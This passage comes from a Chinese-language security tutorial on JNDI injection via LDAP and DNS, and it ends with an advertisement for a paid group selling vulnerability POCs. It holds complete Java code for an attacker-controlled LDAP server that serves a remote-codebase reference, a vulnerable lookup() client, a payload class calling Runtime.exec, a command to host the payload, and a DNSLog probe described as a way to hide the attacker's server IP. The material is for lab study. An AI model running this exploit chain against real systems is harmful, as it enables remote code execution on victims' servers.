 服务端上，等待客户端的调用并实例化执行。  
  
Reference  
  
reference  
  
=  
  
new  
  
Reference  
(  
"Calculator","Calculator","http://127.0.0.1:8081/"  
);  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5Nwhd9ZJGdXBRicTK1MOnGdgxKnCvkXfM3mPC5L0L9CByHDEYPAiceGhtA/640?wx_fmt=png "")  
  
   
  
   
  
   
  
   
### JNDI+LDAP  
#### 1、基础环境  
  
1、我们先在java目录下新建一个jndi_ldap_injection包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NXkZicOO2QHPLP4ws7qNjciaNVvStq6ibI2FzrPicogqgslfib90VdlT9jyA/640?wx_fmt=png "")  
  
   
  
   
  
2、攻击者搭建LDAP服务器，需要导入unboundid依赖库。  
  
在本项目根目录下创建/lib目录，用于放置本地依赖库，点击下载   
unboundid-ldapsdk-3.2.0.jar  
，导入依赖即可，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NHy8tia5JEsvaBpebm03w6bRvy0Dv2DeiaOt0Rl0GjicU4ceNicSzoef6kg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NpYaKjUc2V5gczUJ06H5ic3JXe7PhHRZ2L1wTB0icop8OHxekG6Cft29g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NG44uLjS3TYAFJlWjWUWT6Ray1kmX0KzlHJ9BqbEXWlwyiacxK2ssIoA/640?wx_fmt=png "")  
  
   
  
   
  
3、创建LDAP的服务端和客户端的代码  
  
LDAPServer.java 服务端代码，服务端是攻击者控制的服务器。  
  
package  
  
jndi_ldap_injection  
;  
  
  
import  
  
java  
.  
net  
.  
InetAddress  
;  
  
import  
  
java  
.  
net  
.  
MalformedURLException  
;  
  
import  
  
java  
.  
net  
.  
URL  
;  
  
import  
  
javax  
.  
net  
.  
ServerSocketFactory  
;  
  
import  
  
javax  
.  
net  
.  
SocketFactory  
;  
  
import  
  
javax  
.  
net  
.  
ssl  
.  
SSLSocketFactory  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
listener  
.  
InMemoryDirectoryServer  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
listener  
.  
InMemoryDirectoryServerConfig  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
listener  
.  
InMemoryListenerConfig  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
listener  
.  
interceptor  
.  
InMemoryInterceptedSearchResult  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
listener  
.  
interceptor  
.  
InMemoryOperationInterceptor  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
sdk  
.  
Entry  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
sdk  
.  
LDAPException  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
sdk  
.  
LDAPResult  
;  
  
import  
  
com  
.  
unboundid  
.  
ldap  
.  
sdk  
.  
ResultCode  
;  
  
  
public  
  
class  
  
LDAPServer  
 {            
  
      
private  
  
static  
  
final  
  
String  
  
LDAP_BASE  
  
=  
  
"dc=example,dc=com"  
;  
  
  
      
public  
  
static  
  
void  
  
main  
  
(  
String  
[]   
args  
)  
 {            
  
          
String  
  
url  
  
=  
  
"http://127.0.0.1:8081/#Calculator"  
;  
  
          
int  
  
port  
  
=  
  
1234  
;  
  
  
          
try  
 {            
  
              
InMemoryDirectoryServerConfig  
  
config  
  
=  
  
new  
  
InMemoryDirectoryServerConfig  
(  
LDAP_BASE  
);  
  
              
config  
.  
setListenerConfigs  
(  
new  
  
InMemoryListenerConfig  
(  
  
                      
"listen",            
  
                      
InetAddress  
.  
getByName  
(  
"0.0.0.0"  
),  
  
                      
port,            
  
                      
ServerSocketFactory  
.  
getDefault  
(),  
  
                      
SocketFactory  
.  
getDefault  
(),  
  
                      
(  
SSLSocketFactory  
)  
  
SSLSocketFactory  
.  
getDefault  
()));  
  
  
              
config  
.  
addInMemoryOperationInterceptor  
(  
new  
  
OperationInterceptor  
(  
new  
  
URL  
(  
url  
)));  
  
              
InMemoryDirectoryServer  
  
ds  
  
=  
  
new  
  
InMemoryDirectoryServer  
(  
config  
);  
  
              
System  
.  
out  
.  
println  
(  
"Listening on 0.0.0.0:"  
  
+  
  
port  
);  
  
              
ds  
.  
startListening  
();  
  
          
}            
  
          
catch  
  
(  
  
Exception  
  
e  
  
)  
 {            
  
              
e  
.  
printStackTrace  
();  
  
          
}            
  
      
}            
  
  
      
private  
  
static  
  
class  
  
OperationInterceptor  
  
extends  
  
InMemoryOperationInterceptor  
 {            
  
          
private  
  
URL  
  
codebase  
;  
  
          
/**  
  
           
*  
  
           
*/  
  
          
public  
  
OperationInterceptor  
  
(  
  
URL  
  
cb  
  
)  
 {            
  
              
this  
.  
codebase  
  
=  
  
cb  
;  
  
          
}            
  
  
          
/**  
  
           
*  
 {@  
inheritDoc  
}            
  
           
*  
  
           
*  
 @  
see  
  
com  
.  
unboundid  
.  
ldap  
.  
listener  
.  
interceptor  
.  
InMemoryOperationInterceptor  
#  
processSearchResult  
(  
com  
.  
unboundid  
.  
ldap  
.  
listener  
.  
interceptor  
.  
InMemoryInterceptedSearchResult  
)  
  
           
*/  
  
          
@  
Override  
  
          
public  
  
void  
  
processSearchResult  
  
(  
  
InMemoryInterceptedSearchResult  
  
result  
  
)  
 {            
  
              
String  
  
base  
  
=  
  
result  
.  
getRequest  
().  
getBaseDN  
();  
  
              
Entry  
  
e  
  
=  
  
new  
  
Entry  
(  
base  
);  
  
              
try  
 {            
  
                  
sendResult  
(  
result,   
base,   
e  
);  
  
              
}            
  
              
catch  
  
(  
  
Exception  
  
e1  
  
)  
 {            
  
                  
e1  
.  
printStackTrace  
();  
  
              
}            
  
          
}            
  
  
          
protected  
  
void  
  
sendResult  
  
(  
  
InMemoryInterceptedSearchResult  
  
result,   
String  
  
base,   
Entry  
  
e  
  
)  
  
throws  
  
LDAPException,   
MalformedURLException  
 {            
  
              
URL  
  
turl  
  
=  
  
new  
  
URL  
(  
this  
.  
codebase,   
this  
.  
codebase  
.  
getRef  
().  
replace  
(  
'  
.  
', '  
/  
'  
).  
concat  
(  
".class"  
));  
  
              
System  
.  
out  
.  
println  
(  
"Send LDAP reference result for "  
  
+  
  
base  
  
+  
  
" redirecting to "  
  
+  
  
turl  
);  
  
              
e  
.  
addAttribute  
(  
"javaClassName",   
"Exploit"  
);  
  
              
String  
  
cbstring  
  
=  
  
this  
.  
codebase  
.  
toString  
();  
  
              
int  
  
refPos  
  
=  
  
cbstring  
.  
indexOf  
(  
'#'  
);  
  
              
if  
  
(  
  
refPos  
  
>  
  
0  
  
)  
 {            
  
                  
cbstring  
  
=  
  
cbstring  
.  
substring  
(  
0,   
refPos  
);  
  
              
}            
  
              
e  
.  
addAttribute  
(  
"javaCodeBase",   
cbstring  
);  
  
              
e  
.  
addAttribute  
(  
"objectClass",   
"javaNamingReference"  
);  
  
              
e  
.  
addAttribute  
(  
"javaFactory",   
this  
.  
codebase  
.  
getRef  
());  
  
              
result  
.  
sendSearchEntry  
(  
e  
);  
  
              
result  
.  
setResult  
(  
new  
  
LDAPResult  
(  
0,   
ResultCode  
.  
SUCCESS  
));  
  
          
}            
  
      
}            
  
}  
  
   
  
   
  
   
  
客户端（LDAPClient.java）代码，客户端代表存在漏洞的受害端。  
  
package  
  
jndi_ldap_injection  
;  
  
  
import  
  
javax  
.  
naming  
.  
InitialContext  
;  
  
import  
  
javax  
.  
naming  
.  
NamingException  
;  
  
  
  
public  
  
class  
  
LDAPClient  
 {            
  
      
public  
  
static  
  
void  
  
main  
(  
String  
[]   
args  
)  
  
throws  
  
NamingException  
{            
  
          
String  
  
url  
  
=  
  
"ldap://127.0.0.1:1234/Calculator"  
;  
  
          
InitialContext  
  
initialContext  
  
=  
  
new  
  
InitialContext  
();  
  
          
initialContext  
.  
lookup  
(  
url  
);  
  
      
}            
  
  
}  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NGOiaY7j9FpDiaQXmyIHxZibuALPtfctZdVibemEe8sHWYAt8yVMZntLTkA/640?wx_fmt=png "")  
  
   
  
   
  
3、HTTP 端恶意载荷（Calculator.java）代码，跟rmi的恶意载荷一样  
  
public  
  
class  
  
Calculator  
 {            
  
      
public  
  
Calculator  
()  
  
throws  
  
Exception  
 {            
  
          
Runtime  
.  
getRuntime  
().  
exec  
(  
"calc"  
);  
  
      
}            
  
}  
  
   
  
   
  
   
#### 2、启动环境  
  
1、将 HTTP 端恶意载荷 Calculator.java，编译成 Calculator.class 文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NmqOdvdww2t6DMUb0MEZd1eichJ3icQ6BBI4Uczzgq6siaM6NlkRBTogYw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NM9HTsJr0CAdmvgYPv7VKBdwu96FJbYDnjNIibhVl0S4NBQGqJjoczLA/640?wx_fmt=png "")  
  
   
  
   
  
2、在 Calculator.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷,这里的端口必须要与 RMIServer.java 的 Reference 里面的链接端口一致  
  
python  
  
-  
m  
  
http  
.  
server  
  
8081da  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NN16LIesBCG7ZK8CaicpFJ75zg3s8dL1az3mjticzib7WO9yfGFkeiazDXw/640?wx_fmt=png "")  
  
   
  
   
  
3、IDEA 将漏洞环境启动起来并实现弹窗，顺序为先其服务端，再起客户端 ，跟rmi一样我就不一一演示了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NFvHaIfxR8eCvbCRrgcrk8xzdwvAlpPDia5rWKZ3PGhzEzfiaIiaOsduRw/640?wx_fmt=png "")  
  
   
  
   
### JNDI+DNS  
  
通过上面我们可知 JNDI 注入可以利用 RMI 协议和LDAP 协议搭建服务然后执行命令，但有个不好的点就是会暴露自己的服务器 IP 。在没有确定存在漏洞前，直接在直接服务器上使用 RMI 或者 LDAP 去执行命令，通过日志可分析得到攻击者的服务器 IP，这样在没有获取成果的前提下还暴露了自己的服务器 IP，得不偿失。  
  
为了解决这个问题，可以使用DNS 协议进行探测，通过 DNS 协议去探测是否真的存在漏洞，再去利用 RMI 或者 LDAP 去执行命令，避免过早暴露服务器 IP，这也是平常大多数人习惯使用 DNSLog 探测的原因之一，同样的 ldap 和 rmi 也可以使用 DNSLog 平台去探测。  
  
   
  
   
  
我们使用RMI的客户端的漏洞代码即可，只需要把可变量uri修改成DNSlog网站的地址即可  
  
package  
  
jndi_rmi_injection  
;  
  
  
import  
  
javax  
.  
naming  
.  
InitialContext  
;  
  
import  
  
javax  
.  
naming  
.  
NamingException  
;  
  
public  
  
class  
  
RMIClient  
 {            
  
      
public  
  
static  
  
void  
  
main  
(  
String  
[]   
args  
)  
  
throws  
  
NamingException  
{            
  
          
String  
  
uri  
  
=  
  
"dns://y9p1pr.dnslog.cn"  
;  
  
          
InitialContext  
  
initialContext  
  
=  
  
new  
  
InitialContext  
();  
  
          
initialContext  
.  
lookup  
(  
uri  
);  
  
      
}            
  
}  
  
   
  
然后运行RMI的客户端，再Refresh Record刷新记录，就可以看到有记录，那么就说明存在JNDI注入漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NNGYSkia2R6gcDFn2oO6ibBElnKZP1HBAx7cXn9plTSzaS9ROmbfibEojQ/640?wx_fmt=png "")  
  
   
  
   
  
   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x5 总结**  
  
  
我们在测试JNDI注入的时候，可以使用DNS协议的测试方法，利用dnslog网站的返回值，来判断是否存在JNDI注入。  
  
JNDI漏洞的产生主要是   
lookup()  
 的参数可控，攻击者在远程服务器上构造恶意的   
Reference  
 类绑定在   
RMIServer  
 的   
Registry  
 里面，然后客户端调用   
lookup()  
 函数里面的对象，远程类获取到   
Reference  
 对象，客户端接收   
Reference  
 对象后，寻找   
Reference  
 中指定的类，若查找不到，则会在   
Reference  
 中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行，从而达到   
JNDI  
 注入攻击。  
  
   
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x6 参考链接**  
  
  
1  
、  
https  
:  
//  
xz  
.  
aliyun  
.  
com  
/  
t  
/  
12277  
?  
time__1311  
=  
mqmhD5YIOhOD  
%2FD0lbGkb28MDj2C%2BbeD  
&  
alichlgref  
=  
https  
%3A%2F%2Fwww  
.  
google  
.  
com  
%2F#  
toc  
-  
10  
  
  
2  
、  
https  
:  
//  
www  
.  
cnblogs  
.  
com  
/  
LittleHann  
/  
p  
/  
17768907  
.  
html  
#_lab2_2_1            
  
  
3  
、  
https  
:  
//  
www  
.  
cnblogs  
.  
com  
/  
0dot7  
/  
p  
/  
17259327  
.  
html  
  
   
  
   
  
   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、微信小群一起挖洞
5、不定期有众测、渗透测试项目
```  
  
  
  
  
  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvT909pnt52QK4KBYlDKhSh4ngASib4chZMPfJHDNOXNk60xeot0puNfmOsvLiawuKYYaKucwBUe1Q/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满150人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
    
  
   
  
   
  
  
